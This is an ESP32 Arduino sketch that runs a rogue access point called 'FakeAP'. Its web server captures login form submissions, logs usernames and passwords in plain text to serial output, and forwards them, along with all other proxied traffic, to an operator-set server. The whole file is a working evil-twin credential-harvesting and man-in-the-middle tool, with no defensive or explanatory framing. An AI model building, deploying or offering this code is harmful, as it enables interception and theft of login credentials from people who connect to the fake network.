#include <WiFi.h>
#include <WebServer.h>
#include <HTTPClient.h>

// Network credentials
const char* REAL_SSID = "";
const char* REAL_PASSWORD = "";
const char* AP_SSID = "FakeAP";
const char* AP_PASSWORD = "fakepassword";

// Target server configuration
const char* TARGET_SERVER = "";               // Your laptop's IP
const int TARGET_PORT = 8080;                 // Your server's port

WebServer webServer(80);

void handleSubmitLogin() {
    Serial.println("\n=== Login Form Submission Captured ===");

    // Print all received arguments for debugging
    Serial.println("Number of arguments: " + String(webServer.args()));
    for (int i = 0; i < webServer.args(); i++) {
        Serial.println("Arg " + String(i) + ": " + webServer.argName(i) + ": " + webServer.arg(i));
    }

    // Handle the FormData submission
    String username = webServer.arg("username");
    String password = webServer.arg("password");

    Serial.println("\nCaptured Credentials:");
    Serial.println("Username: " + username);
    Serial.println("Password: " + password);

    // Forward the request to the real server
    HTTPClient http;
    String targetUrl = "http://" + String(TARGET_SERVER) + ":" + String(TARGET_PORT) + "/submit-login";

    Serial.println("\nForwarding to: " + targetUrl);
    http.begin(targetUrl);

    // Set headers for FormData
    http.addHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary");

    // Construct FormData body
    String postData = "------WebKitFormBoundary\r\n";
    postData += "Content-Disposition: form-data; name=\"username\"\r\n\r\n";
    postData += username + "\r\n";
    postData += "------WebKitFormBoundary\r\n";
    postData += "Content-Disposition: form-data; name=\"password\"\r\n\r\n";
    postData += password + "\r\n";
    postData += "------WebKitFormBoundary--\r\n";

    // Forward the POST request
    int httpCode = http.POST(postData);
    Serial.println("Forward response code: " + String(httpCode));

    String response;
    if (httpCode > 0) {
        response = http.getString();
        Serial.println("Server response: " + response);
    } else {
        response = "{\"message\":\"Error\",\"user\":\"unknown\"}";
        Serial.println("Forward request failed");
    }

    // Send response back to client
    webServer.sendHeader("Content-Type", "application/json");
    webServer.send(200, "application/json", response);

    http.end();
}

void handleNotFound() {
    String requestedHost = webServer.hostHeader();
    String requestedUri = webServer.uri();

    Serial.println("\n=== New Request ===");
    Serial.println("Requested Host: " + requestedHost);
    Serial.println("Requested URI: " + requestedUri);
    Serial.println("Method: " + String((webServer.method() == HTTP_GET) ? "GET" : "POST"));

    // Forward the request to target server
    String targetUrl = "http://" + String(TARGET_SERVER) + ":" + String(TARGET_PORT) + requestedUri;
    Serial.println("Forwarding to: " + targetUrl);

    HTTPClient http;
    http.begin(targetUrl);

    // Copy original headers
    for (int i = 0; i < webServer.headers(); i++) {
        http.addHeader(webServer.headerName(i), webServer.header(i));
    }

    int httpCode;
    if (webServer.method() == HTTP_GET) {
        httpCode = http.GET();
    } else {
        String postBody = webServer.arg("plain");
        httpCode = http.POST(postBody);
    }

    Serial.println("Forward response code: " + String(httpCode));

    if (httpCode > 0) {
        String response = http.getString();
        // If it's the login page, serve it directly
        if (requestedUri == "/login") {
            webServer.send(200, "text/html", response);
        } else {
            webServer.send(httpCode, http.header("Content-Type").c_str(), response);
        }
    } else {
        webServer.send(500, "text/plain", "Forward request failed");
    }

    http.end();
}

void setup() {
    Serial.begin(115200);

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(AP_SSID, AP_PASSWORD);

    Serial.print("Fake AP IP: ");
    Serial.println(WiFi.softAPIP());

    WiFi.begin(REAL_SSID, REAL_PASSWORD);
    while (WiFi.status() != WL_CONNECTED) {
        delay(500);
        Serial.print(".");
    }

    Serial.println("\nConnected to real WiFi");
    Serial.print("ESP Station IP: ");
    Serial.println(WiFi.localIP());

    // Set up routes
    webServer.on("/submit-login", HTTP_POST, handleSubmitLogin);
    webServer.onNotFound(handleNotFound);
    webServer.begin();

    Serial.println("Web server started");
}

void loop() {
    webServer.handleClient();
}
